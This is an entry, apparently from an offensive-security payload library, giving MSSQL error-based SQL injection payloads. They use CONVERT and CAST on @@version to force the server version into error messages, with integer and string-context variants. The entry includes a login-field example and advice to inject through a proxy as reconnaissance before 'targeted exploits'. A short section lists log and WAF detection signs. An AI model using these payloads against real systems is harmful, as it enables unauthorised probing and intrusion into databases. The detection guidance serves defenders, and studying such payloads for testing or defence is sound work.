---
id: dd112e3c-04f3-4a32-80de-01aff1277c1f
name: MSSQL-@@version-Conversion-for-Error-Based-Extraction
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:33.815785+00:00'
updated_at: '2023-04-10T20:22:41.316592+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - sql-injection
  - error-based
  - version-extraction
validated: true
---

# MSSQL-@@version-Conversion-for-Error-Based-Extraction

## Code

```sql
For integer inputs : convert(int,@@version)
For integer inputs : cast((SELECT @@version) as int)

For string inputs   : ' + convert(int,@@version) + '
For string inputs   : ' + cast((SELECT @@version) as int) + '
```

## Description

This SQL code snippet provides variants of conversion payloads using CONVERT and CAST functions on the @@version variable to trigger error-based information disclosure in MSSQL. The integer input versions are for numeric parameters, while string versions use concatenation for text fields. When executed in a vulnerable query, it forces a type conversion error that embeds the full server version in the error message.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| @@version | Built-in MSSQL variable for server version (no substitution needed) | N/A |

## Usage

Embed these payloads in SQL injection points during reconnaissance. For example, in a web app login: username=' OR convert(int,@@version)--. Use a proxy like Burp Suite to capture and modify requests. This is typically the second step after confirming injection, to gather version info for targeted exploits.

## Detection

- Monitor web application logs for SQL errors mentioning "conversion failed" or "varchar to int".
- WAF rules detecting keywords like "@@version", "convert(int", or "cast...as int" in queries.
- Database audit logs showing failed type conversions on system variables.
- Unusual error responses in HTTP traffic.

## Related

- [[procedures/MSSQL-Error-Based-Injection-to-Extract-Version]]
- [[commands/convert-int-@@version]]
